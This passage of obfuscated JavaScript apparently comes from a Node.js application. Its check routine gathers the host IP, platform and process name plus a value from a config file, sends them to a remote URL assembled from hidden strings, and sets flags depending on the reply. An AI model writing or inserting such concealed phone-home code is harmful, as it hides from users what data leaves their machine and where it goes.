bfwhbjwdwd_0x2c5477(_0x147d26-0x18f,_0x318bc7,_0x95419c-0x64,_0x439365-0x98,_0x147d26- -0x5e1);}return JSON[_0x505ebc(0x206,0x19f,0x231,0x243,0x1b6)](_0x4fb3f1)['IP'];},check=async()=>{function _0x7e9e63(_0x346338,_0x58e142,_0x2e4b47,_0x3bbeb8,_0x4ed8fc){return bfwhbjwdwd_0x2c5477(_0x346338-0xfd,_0x346338,_0x2e4b47-0xea,_0x3bbeb8-0x185,_0x58e142- -0x3b1);}var _0x3f6fb7={'ynyuq':_0x234415(0x466,0x3ed,0x3fc,0x36d,0x3f0)+_0x496e9e(0x4a4,0x51d,0x576,0x50f,0x597),'htSzO':_0x7e9e63(0x6c,0x34,0x6e,0x1b,0x31)+'um','gcyAz':function(_0x229dfa,_0x5764c5){return _0x229dfa(_0x5764c5);},'vcXHs':_0x7e9e63(-0x64,-0x2,-0x7f,0x9,-0x8a)+_0x234415(0x470,0x438,0x4a8,0x4e8,0x46a)+_0x496e9e(0x533,0x53a,0x59c,0x514,0x4d3)+_0xf1433f(0x5a4,0x53f,0x60f,0x530,0x5c5)+_0x496e9e(0x5b4,0x573,0x543,0x54f,0x59d)+_0xf1433f(0x525,0x49b,0x4ec,0x4a4,0x576)+'m','pkAtg':_0xf1433f(0x57b,0x5b3,0x587,0x502,0x521)+_0x562a65(0x421,0x484,0x4b3,0x408,0x43a),'xjvIg':_0x7e9e63(0x9e,0x34,0x24,0x67,0x7e)+_0x496e9e(0x4a8,0x519,0x4f5,0x51d,0x595),'mzpmZ':_0x7e9e63(0xb3,0x29,0x65,0x74,-0x4)+_0x234415(0x383,0x368,0x417,0x391,0x3ba)+_0x496e9e(0x5c3,0x526,0x502,0x582,0x601)+_0x496e9e(0x4e7,0x4b1,0x421,0x482,0x4cb)+_0x562a65(0x478,0x40a,0x392,0x3ab,0x3df),'vsmIR':_0xf1433f(0x4e7,0x567,0x4bb,0x4f6,0x499)+_0x562a65(0x3b0,0x3d6,0x450,0x413,0x365)+_0xf1433f(0x593,0x56e,0x55d,0x5fe,0x5fb),'qFSBi':function(_0x344b36,_0x3fbfed){return _0x344b36!=_0x3fbfed;},'JDlAc':_0xf1433f(0x4b2,0x4fd,0x502,0x4e9,0x52d),'vPWJJ':function(_0x2f5ef6,_0x13a331,_0x29f2d7){return _0x2f5ef6(_0x13a331,_0x29f2d7);},'NHXTe':_0x496e9e(0x546,0x5bd,0x5e7,0x55f,0x5ba)+_0x234415(0x414,0x4de,0x426,0x3db,0x468)+']','IHbKV':function(_0x2596d8,_0x471bae){return _0x2596d8(_0x471bae);},'eyQiw':function(_0x4c6d52,_0x4d9ff4){return _0x4c6d52(_0x4d9ff4);},'hcGbf':_0x562a65(0x44e,0x455,0x46f,0x4cf,0x436)+_0xf1433f(0x591,0x560,0x613,0x509,0x556)+_0x234415(0x342,0x379,0x407,0x3bc,0x3b6)+_0x562a65(0x3b6,0x3a3,0x3e0,0x384,0x3e9)+_0xf1433f(0x4bf,0x512,0x548,0x508,0x450)+_0xf1433f(0x52f,0x50c,0x56d,0x527,0x4ce)+_0x7e9e63(-0x3e,-0x46,0x14,0x32,-0xc2)+_0x562a65(0x3c4,0x3b6,0x3f5,0x413,0x3fa)+_0x562a65(0x442,0x3fd,0x39e,0x45e,0x42f)+_0x562a65(0x3f9,0x39c,0x369,0x370,0x3ac)+_0x234415(0x3d6,0x3fa,0x469,0x418,0x418)+_0x496e9e(0x479,0x539,0x49c,0x4b4,0x42e)+_0xf1433f(0x4f8,0x55a,0x4c3,0x53b,0x488)+_0xf1433f(0x57f,0x583,0x52b,0x5b7,0x538),'TeOKh':_0x234415(0x413,0x3da,0x47f,0x49c,0x445)+_0x7e9e63(-0xd,0x23,-0x58,-0x5,0x1a)+_0x562a65(0x447,0x420,0x404,0x4ad,0x3df)+_0x496e9e(0x59e,0x554,0x5bb,0x580,0x55d)+_0x496e9e(0x57e,0x570,0x584,0x53f,0x4dc)+_0x7e9e63(-0xbc,-0x38,0x50,0x14,0x3c),'ODgTL':function(_0x17561d,_0xc3277c){return _0x17561d!==_0xc3277c;},'AVqGs':_0x496e9e(0x52b,0x56d,0x53d,0x535,0x4bc),'vbHdt':function(_0x5eb575,_0xc22db4){return _0x5eb575!=_0xc22db4;},'vwJSF':function(_0x98ed4c,_0x8cc8ff){return _0x98ed4c!=_0x8cc8ff;},'bwZCj':function(_0x33164b,_0x3d5f4b){return _0x33164b!=_0x3d5f4b;},'JZEMC':function(_0x3ce3d7){return _0x3ce3d7();},'cEPUX':function(_0x5e7a9a,_0x388641){return _0x5e7a9a===_0x388641;},'YpXvs':_0x496e9e(0x56d,0x556,0x526,0x4f6,0x4e8),'MTrKn':_0xf1433f(0x52d,0x5b7,0x568,0x56a,0x4a3),'krXmR':function(_0xf932a9,_0x1d9bb4){return _0xf932a9===_0x1d9bb4;},'EJLZm':_0x7e9e63(-0x25,-0x69,-0xef,-0x74,-0x73),'zpSeS':_0x234415(0x496,0x3ff,0x456,0x446,0x46d),'XbyYK':function(_0x469685,_0x473a22){return _0x469685==_0x473a22;},'qHfmd':function(_0x5a9e88,_0x567a69){return _0x5a9e88===_0x567a69;},'ayXDs':_0x234415(0x381,0x3d1,0x357,0x3fa,0x3e2),'GTVuu':_0x496e9e(0x5b8,0x57b,0x568,0x559,0x58f),'Ufnfs':function(_0x358552,_0x4012f2){return _0x358552(_0x4012f2);},'tJZfY':function(_0x51adbd,_0x4d023c){return _0x51adbd(_0x4d023c);},'wzMUs':function(_0x7bdfb5,_0x49dcd3){return _0x7bdfb5==_0x49dcd3;},'xbmWe':function(_0x151235,_0x6571f5){return _0x151235===_0x6571f5;},'ZgAIj':_0x562a65(0x43c,0x46f,0x41e,0x45c,0x411),'BrAjY':_0x7e9e63(-0xbb,-0x3d,-0x83,-0x4b,0xe)+_0x7e9e63(0xe,-0x43,0x33,-0x7c,-0xb8),'ZdOLk':_0x496e9e(0x4c4,0x517,0x48e,0x4d0,0x4ff),'dTqhp':_0xf1433f(0x5a5,0x58e,0x568,0x51f,0x572),'rbtOR':_0x562a65(0x3b0,0x3f7,0x45a,0x3b0,0x427)+_0x496e9e(0x494,0x4b1,0x473,0x4a1,0x52a),'GtvSy':_0xf1433f(0x565,0x5af,0x5e0,0x57f,0x5b6),'ATxDd':function(_0x584c42,_0x54375a){return _0x584c42(_0x54375a);},'wsGak':function(_0x392f1b,_0x2d3a39){return _0x392f1b(_0x2d3a39);},'qSpus':function(_0x4c28c4,_0x496a34){return _0x4c28c4(_0x496a34);},'SGpzE':function(_0x384ccd,_0xa1bee2){return _0x384ccd!==_0xa1bee2;},'AFOVE':_0x496e9e(0x484,0x4b8,0x44b,0x477,0x438),'zDKvg':_0x7e9e63(-0x34,-0x10,-0x78,-0x91,-0x41),'cTQZF':_0x562a65(0x3b9,0x3f3,0x467,0x3f1,0x386)+_0x7e9e63(0x37,-0x43,-0x61,-0x7,-0x90),'JBxzR':function(_0x5090ff,_0xb38b51){return _0x5090ff(_0xb38b51);},'VhNTu':function(_0x2c4061,_0x852e82){return _0x2c4061(_0x852e82);},'nlYnw':_0x7e9e63(0x86,0x46,0xbe,0x31,0x9),'wslhw':_0x234415(0x34d,0x444,0x386,0x430,0x3c6),'mlNfc':_0x234415(0x37e,0x429,0x41f,0x3ac,0x3e4)+_0x7e9e63(-0x1,-0x73,-0x78,-0xd8,-0x5a),'odKSc':_0x562a65(0x3ee,0x47a,0x3fe,0x3ef,0x4f2),'kgYMj':_0x7e9e63(0xb3,0x45,-0x23,0x95,0x4a),'DNHhc':function(_0x10f3af,_0x2420bf){return _0x10f3af(_0x2420bf);}};function _0x234415(_0x1be294,_0x5940a3,_0x39bc9,_0x24e020,_0x201d51){return bfwhbjwdwd_0x2c5477(_0x1be294-0x150,_0x39bc9,_0x39bc9-0x121,_0x24e020-0xf8,_0x201d51-0x96);}try{if(_0x3f6fb7[_0xf1433f(0x586,0x5f6,0x59c,0x60e,0x570)](_0x3f6fb7[_0x234415(0x443,0x514,0x4a2,0x45e,0x48e)],_0x3f6fb7[_0x496e9e(0x59a,0x58b,0x51f,0x544,0x50f)]))_0x3810f5[_0x562a65(0x40d,0x38f,0x325,0x3b1,0x3e0)](_0x579a69[_0xf1433f(0x558,0x55a,0x4f4,0x58a,0x51d)][_0x562a65(0x3ef,0x3e8,0x3a5,0x3cd,0x3b7)+_0x234415(0x4a0,0x4ec,0x431,0x4e2,0x472)]);else{var _0x3ea8b5;if(_0x3f6fb7[_0x7e9e63(0x69,0x6c,0xf3,0xb9,0x34)](process[_0x496e9e(0x4d9,0x4c7,0x50c,0x49d,0x41b)][_0x7e9e63(0x19,0x1c,-0x68,0x48,0x18)+_0x562a65(0x33d,0x38d,0x360,0x3b3,0x309)],undefined))_0x3ea8b5=process[_0x7e9e63(0xd,-0x60,-0x67,-0x9e,-0xd)][_0x7e9e63(0x28,0x1c,-0x66,-0x66,-0x5b)+_0x7e9e63(-0xbd,-0x7c,-0xa0,-0xcd,-0xb1)];else{if(_0x3f6fb7[_0x562a65(0x363,0x39d,0x3e4,0x3cd,0x3f2)](os[_0x234415(0x3ac,0x346,0x3d1,0x3fd,0x3d3)+_0x234415(0x541,0x46f,0x4b4,0x53c,0x4c2)](),null)||_0x3f6fb7[_0x7e9e63(0x47,0x3d,0xb7,0x33,0x5b)](os[_0x496e9e(0x46a,0x4f4,0x4bc,0x489,0x4f4)+_0xf1433f(0x59c,0x624,0x59f,0x532,0x618)](),undefined))_0x3ea8b5=os[_0x562a65(0x398,0x395,0x31a,0x3c5,0x307)+_0x7e9e63(0x109,0x7b,0x9e,0x72,0x5a)]();else _0x3ea8b5=_0x3f6fb7[_0xf1433f(0x589,0x570,0x50a,0x5ba,0x5cf)](getIP);}if(Database[_0x7e9e63(0xa5,0x6b,0x68,0x1a,0xe0)](_0x3f6fb7[_0xf1433f(0x4b6,0x4fc,0x4a4,0x43e,0x462)])){if(_0x3f6fb7[_0x234415(0x446,0x448,0x3a1,0x3e7,0x3d2)](_0x3f6fb7[_0x496e9e(0x46a,0x4d2,0x469,0x4c2,0x4f9)],_0x3f6fb7[_0x496e9e(0x499,0x4e3,0x50d,0x4db,0x4d3)])){var _0x28a668=_0x3f6fb7[_0x234415(0x4cd,0x483,0x505,0x46d,0x4a0)][_0x234415(0x4d5,0x517,0x455,0x4b7,0x49a)]('|'),_0x5c60ab=-0x17e1+-0x90c*0x2+0x1*0x29f9;while(!![]){switch(_0x28a668[_0x5c60ab++]){case'0':_0x358a50[_0x7e9e63(-0x2d,0x2a,0xa2,0xae,0x80)](_0x3f6fb7[_0x7e9e63(-0x2,-0x83,-0x77,-0x9a,-0xcc)],!![]);continue;case'1':_0x3f6fb7[_0xf1433f(0x4dd,0x4db,0x51a,0x50f,0x541)](_0x14e3fa,_0x3f6fb7[_0x496e9e(0x563,0x5df,0x5bd,0x558,0x541)]);continue;case'2':_0x5d5afa[_0x496e9e(0x4e0,0x550,0x532,0x527,0x596)](_0x3f6fb7[_0x562a65(0x3c5,0x39e,0x322,0x3be,0x3b0)],_0x6076aa);continue;case'3':_0x5ba759[_0x7e9e63(-0x53,0x2a,0x4b,0x6a,-0x23)](_0x3f6fb7[_0x7e9e63(0x91,0x49,0x5e,0xd2,0x5b)],_0x3f6fb7[_0x234415(0x401,0x396,0x3cc,0x48f,0x403)](_0x14ca4d,_0x3f6fb7[_0x7e9e63(-0x94,-0x44,-0xd2,-0x58,-0x93)](_0x2147ef,_0x3f6fb7[_0x234415(0x3f6,0x3d2,0x411,0x384,0x3f1)])[_0x234415(0x4ac,0x3c8,0x3c8,0x3c9,0x42c)+'y']));continue;case'4':_0x1a0d8f[_0x496e9e(0x4f5,0x597,0x554,0x52f,0x5b8)+'ng'][_0xf1433f(0x54b,0x554,0x4f0,0x5d8,0x4e4)](_0x3f6fb7[_0x562a65(0x359,0x37f,0x3ca,0x38f,0x3b0)],!![]);continue;}break;}}else _0x3f6fb7[_0x496e9e(0x45c,0x4c9,0x404,0x491,0x437)](Database[_0x234415(0x436,0x440,0x42a,0x408,0x473)](_0x3f6fb7[_0x7e9e63(-0x49,-0x6b,-0xa2,-0x6c,-0x65)]),_0x3ea8b5)&&(_0x3f6fb7[_0x562a65(0x41c,0x43e,0x469,0x420,0x4bc)](_0x3f6fb7[_0x562a65(0x4bf,0x457,0x3ec,0x412,0x41c)],_0x3f6fb7[_0xf1433f(0x508,0x513,0x4cc,0x52b,0x518)])?_0x326cee[_0x562a65(0x3fa,0x3ef,0x436,0x3f5,0x3b6)](_0x17a2d3):(Database[_0x562a65(0x411,0x433,0x47c,0x487,0x419)](_0x3f6fb7[_0x7e9e63(-0x1,-0x83,-0x8,-0x68,-0x96)],![]),Database[_0xf1433f(0x54b,0x5a0,0x5a7,0x4f9,0x5a0)](_0x3f6fb7[_0x496e9e(0x5ab,0x579,0x545,0x546,0x576)],''),Database[_0xf1433f(0x54b,0x513,0x519,0x559,0x569)](_0x3f6fb7[_0x234415(0x34f,0x469,0x3a5,0x3a4,0x3dc)],_0x3ea8b5)));}if(Database[_0xf1433f(0x58c,0x54c,0x5ec,0x5c4,0x515)](_0x3f6fb7[_0x496e9e(0x5a0,0x58d,0x589,0x546,0x53e)])&&_0x3f6fb7[_0xf1433f(0x4b5,0x511,0x4d0,0x510,0x47c)](Database[_0x496e9e(0x4db,0x5a8,0x4d4,0x529,0x537)](_0x3f6fb7[_0x496e9e(0x4d9,0x57f,0x506,0x546,0x4d8)]),'')&&Database[_0x496e9e(0x5b8,0x5c8,0x519,0x568,0x50d)](_0x3f6fb7[_0xf1433f(0x49e,0x4bf,0x42a,0x4e0,0x462)])&&_0x3f6fb7[_0x234415(0x465,0x468,0x3aa,0x39b,0x41d)](Database[_0x496e9e(0x4b3,0x4b7,0x571,0x529,0x54c)](_0x3f6fb7[_0xf1433f(0x49e,0x4b0,0x50b,0x422,0x46b)]),!![])){if(_0x3f6fb7[_0x7e9e63(-0x31,-0xd,-0x49,0x0,0x42)](_0x3f6fb7[_0xf1433f(0x516,0x583,0x513,0x553,0x49a)],_0x3f6fb7[_0xf1433f(0x493,0x435,0x50c,0x438,0x41c)]))return;else{var {body:_0x658163}=await _0x3f6fb7[_0x234415(0x4dd,0x4f7,0x455,0x53d,0x4b1)](Fetch,_0x7e9e63(0x17,0x57,0x5d,0x70,0x99)+_0xf1433f(0x4dc,0x4f6,0x4dd,0x523,0x486)+_0x562a65(0x403,0x3c1,0x445,0x3dc,0x3b8)+_0x496e9e(0x500,0x47b,0x513,0x4d2,0x4c1)+_0x496e9e(0x535,0x53c,0x558,0x4ee,0x4b1)+_0x562a65(0x36d,0x392,0x35c,0x342,0x3d0)+_0x496e9e(0x3eb,0x4de,0x4ef,0x46d,0x3e1)+_0x7e9e63(-0x5,-0x1e,-0x7b,-0x24,-0x52)+_0xf1433f(0x521,0x53f,0x588,0x590,0x51e)+_0x7e9e63(-0xb,0x60,0x33,0xda,0xd6)+_0x562a65(0x3e4,0x399,0x3f5,0x412,0x3b5)+_0x3f6fb7[_0x562a65(0x485,0x473,0x420,0x3f0,0x485)](String,_0x3f6fb7[_0xf1433f(0x52e,0x566,0x503,0x541,0x4aa)](require,_0x3f6fb7[_0x496e9e(0x4ac,0x4cc,0x45f,0x4a7,0x4c8)])[_0x562a65(0x36d,0x3ee,0x3cf,0x413,0x390)+'y'])+(_0x496e9e(0x4ff,0x4e8,0x4d6,0x48f,0x421)+_0x7e9e63(-0x7a,-0x67,-0xaa,-0xa8,0x16))+_0x3ea8b5+(_0x562a65(0x4df,0x46c,0x4c6,0x4c1,0x3f8)+_0x234415(0x481,0x53f,0x4fd,0x532,0x4bf))+process[_0x234415(0x441,0x3c4,0x388,0x3b6,0x3e7)][_0x562a65(0x3d8,0x39a,0x408,0x344,0x375)]+(_0x496e9e(0x41e,0x48b,0x40c,0x47d,0x436)+_0x562a65(0x4a5,0x47d,0x4d1,0x433,0x41a))+process[_0xf1433f(0x572,0x53a,0x568,0x564,0x5f2)+_0x562a65(0x429,0x3c9,0x448,0x3cf,0x3d9)]);if(_0x3f6fb7[_0xf1433f(0x59d,0x5a8,0x5a9,0x603,0x572)](JSON[_0x496e9e(0x4e2,0x47a,0x54b,0x4d7,0x468)](_0x658163)[_0xf1433f(0x523,0x4b0,0x5ab,0x4f6,0x521)+'s'],!![])){if(_0x3f6fb7[_0xf1433f(0x594,0x5dd,0x622,0x507,0x5c1)](_0x3f6fb7[_0xf1433f(0x4e8,0x533,0x4a0,0x4d6,0x493)],_0x3f6fb7[_0x7e9e63(0x1b,-0x39,-0x69,0x17,-0xae)])){var _0x52cda1=_0x3f6fb7[_0x562a65(0x46d,0x466,0x3e0,0x443,0x3e2)][_0x234415(0x51f,0x51f,0x47f,0x4b8,0x49a)]('|'),_0x4dad94=0x6*-0xa7+0x56f*-0x6+0x2484;while(!![]){switch(_0x52cda1[_0x4dad94++]){case'0':Database[_0xf1433f(0x54b,0x512,0x5d8,0x5a0,0x53e)](_0x3f6fb7[_0x7e9e63(-0xec,-0x6b,-0x55,-0xbb,-0x51)],_0x3ea8b5);continue;case'1':Database[_0x234415(0x416,0x46d,0x472,0x427,0x471)](_0x3f6fb7[_0x7e9e63(-0x16,-0x83,-0xf8,-0x6e,-0x8c)],!![]);continue;case'2':global[_0x7e9e63(-0x58,0x32,0x6b,0x77,-0x21)+'ng'][_0x7e9e63(0x9d,0x2a,0x3b,0x20,-0x5c)](_0x3f6fb7[_0x562a65(0x31e,0x37f,0x354,0x3a6,0x3b6)],!![]);continue;case'3':_0x3f6fb7[_0x562a65(0x42b,0x3c5,0x415,0x3b4,0x433)](logger,_0x3f6fb7[_0x234415(0x4d7,0x4f6,0x433,0x4b6,0x4a2)]);continue;case'4':Database[_0x562a65(0x4ab,0x433,0x484,0x423,0x3cb)](_0x3f6fb7[_0xf1433f(0x56a,0x517,0x4f2,0x5f6,0x5bc)],_0x3f6fb7[_0xf1433f(0x4dd,0x560,0x50f,0x55a,0x543)](String,_0x3f6fb7[_0x562a65(0x370,0x3c5,0x3ed,0x3e8,0x3c0)](require,_0x3f6fb7[_0x234415(0x41e,0x451,0x399,0x37e,0x3f1)])[_0xf1433f(0x506,0x498,0x4c5,0x4a4,0x50e)+'y']));continue;}break;}}else _0x3f6fb7[_0x496e9e(0x570,0x573,0x597,0x540,0x4ec)](_0x27f96a[_0x7e9e63(0x34,0x2c,-0x4a,0x17,0x35)](_0x3f6fb7[_0x496e9e(0x483,0x480,0x477,0x492,0x514)]),_0x11fb54)&&(_0xa4d470[_0x7e9e63(0x90,0x2a,0x75,0xaf,-0x3d)](_0x3f6fb7[_0x7e9e63(-0xdf,-0x83,-0x4d,-0x110,-0xad)],![]),_0x1034e3[_0xf1433f(0x54b,0x501,0x59a,0x547,0x4d2)](_0x3f6fb7[_0x562a65(0x4ac,0x452,0x473,0x447,0x3d6)],''),_0x5553c6[_0x7e9e63(-0x8,0x2a,0xb5,-0x59,0xb4)](_0x3f6fb7[_0x562a65(0x3c0,0x39e,0x381,0x33a,0x38f)],_0x5f4440));}else{if(_0x3f6fb7[_0x7e9e63(0xc0,0x65,0x3,-0x4,-0x15)](_0x3f6fb7[_0xf1433f(0x54e,0x58a,0x5c8,0x4f5,0x51c)],_0x3f6fb7[_0xf1433f(0x597,0x566,0x5e5,0x571,0x598)])){var _0x3073e5=_0x3f6fb7[_0x496e9e(0x4d7,0x4dc,0x47c,0x4cd,0x558)][_0x234415(0x464,0x48a,0x4c8,0x42e,0x49a)]('|'),_0x4c3e6f=-0x1*0x1479+-0x1043+0x4*0x92f;while(!![]){switch(_0x3073e5[_0x4c3e6f++]){case'0':_0x3f6fb7[_0x562a65(0x3c3,0x408,0x3cd,0x38e,0x437)](logger,JSON[_0xf1433f(0x4fb,0x53d,0x49b,0x4b4,0x491)](_0x658163)[_0x562a65(0x3d2,0x3f5,0x412,0x453,0x424)+'ge']);continue;case'1':global[_0x562a65(0x42c,0x43b,0x3c9,0x4c7,0x3f1)+'ng'][_0x234415(0x3f5,0x4b6,0x4c3,0x4fe,0x471)](_0x3f6fb7[_0x234415(0x445,0x3de,0x3b5,0x375,0x3bd)],![]);continue;case'2':Database[_0xf1433f(0x54b,0x553,0x5ab,0x564,0x523)](_0x3f6fb7[_0x496e9e(0x4eb,0x53e,0x536,0x546,0x5b0)],'');continue;case'3':_0x3f6fb7[_0x562a65(0x501,0x473,0x500,0x3f5,0x490)](logger,_0x3f6fb7[_0xf1433f(0x513,0x549,0x51a,0x58a,0x4b7)]);continue;case'4':Database[_0x234415(0x435,0x413,0x455,0x410,0x471)](_0x3f6fb7[_0x496e9e(0x4d7,0x507,0x4cd,0x47a,0x4fa)],![]);continue;}break;}}else _0x132b0d=_0x5cf75d;}}}else{if(_0x3f6fb7[_0xf1433f(0x520,0x4c6,0x596,0x57b,0x564)](require,_0x3f6fb7[_0x496e9e(0x44d,0x520,0x45f,0x4a7,0x439)])[_0x234415(0x486,0x475,0x41c,0x45f,0x42c)+'y']){if(_0x3f6fb7[_0xf1433f(0x556,0x5d9,0x4f5,0x509,0x598)](_0x3f6fb7[_0x562a65(0x368,0x381,0x381,0x38f,0x351)],_0x3f6fb7[_0x562a65(0x34a,0x381,0x36e,0x2fa,0x3ea)])){var {body:_0x658163}=await _0x3f6fb7[_0x7e9e63(0x3d,0x22,0x3f,0xa2,-0x58)](Fetch,_0x234415(0x4c7,0x452,0x433,0x521,0x49e)+_0x562a65(0x404,0x3c4,0x419,0x3c2,0x34d)+_0x562a65(0x33b,0x3c1,0x3c5,0x3c5,0x42c)+_0x7e9e63(0x30,-0x2b,-0x72,-0x11,0x2e)+_0xf1433f(0x512,0x592,0x4f2,0x484,0x524)+_0xf1433f(0x4aa,0x4ff,0x4ee,0x52e,0x48e)+_0xf1433f(0x491,0x44c,0x421,0x40d,0x4a9)+_0x496e9e(0x511,0x4a0,0x4e9,0x4df,0x4d1)+_0x234415(0x414,0x476,0x4b7,0x426,0x447)+_0xf1433f(0x581,0x594,0x57a,0x5d3,0x5a1)+_0x7e9e63(-0x29,-0x70,0x18,0x16,-0x17)+_0x3f6fb7[_0x234415(0x4cb,0x4ed,0x448,0x4d0,0x4c0)](String,_0x3f6fb7[_0x562a65(0x352,0x3b4,0x394,0x335,0x3a0)](require,_0x3f6fb7[_0xf1433f(0x4cb,0x49c,0x47b,0x50a,0x4a2)])[_0x234415(0x3e1,0x410,0x3ff,0x4ab,0x42c)+'y'])+(_0x496e9e(0x435,0x500,0x49d,0x48f,0x43e)+_0xf1433f(0x4ba,0x42c,0x528,0x4ee,0x502))+_0x3ea8b5+(_0x496e9e(0x5eb,0x5e9,0x568,0x560,0x597)+_0x7e9e63(-0x6,0x78,0xea,0x6c,-0x12))+process[_0x562a65(0x393,0x3a9,0x3aa,0x40a,0x3a7)][_0xf1433f(0x4b2,0x531,0x49f,0x52e,0x440)]+(_0xf1433f(0x4a1,0x430,0x427,0x415,0x4de)+_0x562a65(0x44f,0x47d,0x4e3,0x445,0x436))+process[_0x496e9e(0x5b8,0x549,0x570,0x54e,0x507)+_0x7e9e63(0xf,-0x40,-0x42,-0x2c,-0x46)]);if(_0x3f6fb7[_0xf1433f(0x4f7,0x529,0x498,0x4c9,0x563)](JSON[_0x496e9e(0x459,0x531,0x455,0x4d7,0x550)](_0x658163)[_0x234415(0x3bc,0x470,0x441,0x41f,0x449)+'s'],!![])){if(_0x3f6fb7[_0x562a65(0x435,0x45d,0x4ac,0x445,0x408)](_0x3f6fb7[_0x234415(0x415,0x40a,0x42d,0x43d,0x419)],_0x3f6fb7[_0xf1433f(0x5a2,0x525,0x51d,0x589,0x626)])){var _0x532aa0=_0x3f6fb7[_0xf1433f(0x51d,0x533,0x566,0x4b4,0x56e)][_0x496e9e(0x542,0x5d5,0x58f,0x550,0x4db)]('|'),_0x2932cd=0x1a62+0x89*0x9+-0x475*0x7;while(!![]){switch(_0x532aa0[_0x2932cd++]){case'0':Database[_0x7e9e63(-0x10,0x2a,0x0,0x7d,0xe)](_0x3f6fb7[_0x496e9e(0x509,0x4f3,0x577,0x546,0x4e4)],_0x3f6fb7[_0xf1433f(0x571,0x5f1,0x5b8,0x4ec,0x573)](String,_0x3f6fb7[_0x234415(0x3b8,0x448,0x3bd,0x3b3,0x403)](require,_0x3f6fb7[_0x7e9e63(-0x89,-0x56,-0xb2,-0x4f,-0x4b)])[_0x234415(0x438,0x410,0x3f5,0x44f,0x42c)+'y']));continue;case'1':Database[_0x562a65(0x490,0x433,0x3da,0x3e4,0x3ba)](_0x3f6fb7[_0x562a65(0x34b,0x39e,0x3e5,0x314,0x374)],_0x3ea8b5);continue;case'2':global[_0x234415(0x409,0x402,0x45b,0x4a0,0x479)+'ng'][_0xf1433f(0x54b,0x55e,0x4e4,0x527,0x4cd)](_0x3f6fb7[_0x7e9e63(-0x7a,-0x8a,-0x3a,-0xe6,-0x50)],!![]);continue;case'3':_0x3f6fb7[_0x496e9e(0x562,0x52a,0x4ee,0x516,0x552)](logger,_0x3f6fb7[_0x562a65(0x4dc,0x464,0x4dd,0x435,0x4ab)]);continue;case'4':Database[_0xf1433f(0x54b,0x527,0x571,0x4da,0x5b2)](_0x3f6fb7[_0xf1433f(0x49e,0x483,0x4e4,0x438,0x4c7)],!![]);continue;}break;}}else{if(_0x4a7943[_0x7e9e63(-0xd9,-0x60,0x2,-0x67,-0x44)][_0x3f6fb7[_0x496e9e(0x4e4,0x4a4,0x4dd,0x46e,0x4b2)]])_0x3f6fb7[_0x496e9e(0x4df,0x4bc,0x50c,0x54a,0x577)](_0x40011f,_0x1833fe[_0x496e9e(0x469,0x45f,0x4e9,0x48b,0x41a)+_0x7e9e63(-0xb7,-0x96,-0x68,-0x85,-0xef)+_0x7e9e63(-0xc9,-0x92,-0x2c,-0x97,-0x44)],_0x3f6fb7[_0x496e9e(0x4e7,0x52b,0x5dd,0x56a,0x50c)]),_0xa50456=_0x2ca7e8[_0xf1433f(0x4b9,0x485,0x435,0x52a,0x48c)+_0x7e9e63(-0xd5,-0x61,0x24,-0x3,0x1e)+'te'](_0x2624c8[_0x7e9e63(-0xa8,-0x34,0x27,-0xa4,-0x6d)+_0x234415(0x4b8,0x470,0x49e,0x40b,0x47d)](_0x3577bf),_0x2fb49c[_0xf1433f(0x4c1,0x540,0x4a0,0x45c,0x4a3)][_0x3f6fb7[_0x562a65(0x392,0x37a,0x2f5,0x396,0x3c4)]]);else return _0x36914d;}}else{if(_0x3f6fb7[_0x234415(0x486,0x47e,0x431,0x514,0x49b)](_0x3f6fb7[_0x562a65(0x446,0x3f6,0x47c,0x37b,0x45b)],_0x3f6fb7[_0x234415(0x3d9,0x41d,0x372,0x351,0x3b2)])){var _0x39da62=_0x3f6fb7[_0xf1433f(0x4c6,0x49c,0x488,0x538,0x4d4)][_0x496e9e(0x512,0x5c5,0x5d3,0x550,0x582)]('|'),_0x2246cf=-0xb29*-0x2+-0x1548+-0x10a;while(!![]){switch(_0x39da62[_0x2246cf++]){case'0':_0x3f6fb7[_0x562a65(0x408,0x422,0x44a,0x3cf,0x3c6)](logger,_0x3f6fb7[_0xf1433f(0x513,0x4f5,0x598,0x53d,0x52f)]);continue;case'1':Database[_0xf1433f(0x54b,0x517,0x5b5,0x552,0x51b)](_0x3f6fb7[_0x496e9e(0x5a5,0x598,0x5a5,0x546,0x4f9)],'');continue;case'2':Database[_0xf1433f(0x54b,0x4dd,0x592,0x4fb,0x5a2)](_0x3f6fb7[_0x234415(0x33b,0x34a,0x3a5,0x3e4,0x3c4)],![]);continue;case'3':global[_0x562a65(0x4a6,0x43b,0x40e,0x423,0x446)+'ng'][_0x562a65(0x499,0x433,0x47a,0x3e9,0x3f2)](_0x3f6fb7[_0x562a65(0x343,0x37f,0x31c,0x3ca,0x3c9)],![]);continue;case'4':_0x3f6fb7[_0x7e9e63(0x81,0x79,0x46,0x6e,0x76)](logger,JSON[_0x234415(0x45a,0x3e6,0x39d,0x407,0x421)](_0x658163)[_0x496e9e(0x56b,0x53c,0x54d,0x4e9,0x545)+'ge']);continue;}break;}}else _0x3f6fb7[_0x7e9e63(-0x35,0x4d,0x6b,0x5f,0x32)](_0x4ebf3f,_0x33d914[_0x234415(0x456,0x3bb,0x394,0x43a,0x3d5)+_0x496e9e(0x3fd,0x416,0x4b4,0x467,0x452)+_0xf1433f(0x48f,0x509,0x4cb,0x440,0x4d1)],_0x3f6fb7[_0x7e9e63(0x9f,0x6d,-0xd,0x53,0xd7)]),_0x187d27=_0x37c27a[_0x234415(0x380,0x394,0x40f,0x3f4,0x3df)+_0xf1433f(0x4c0,0x487,0x4c4,0x449,0x4be)+'te'](_0x3af5d1[_0x7e9e63(-0x7b,-0x34,-0x41,0x13,0x26)+_0x496e9e(0x4e0,0x4ee,0x58c,0x533,0x58b)](_0x1cd436),_0x3cf820[_0x496e9e(0x4ac,0x491,0x4af,0x49d,0x51f)][_0x3f6fb7[_0x7e9e63(-0x24,-0x8f,-0xe3,-0x46,-0x11c)]]);}}else 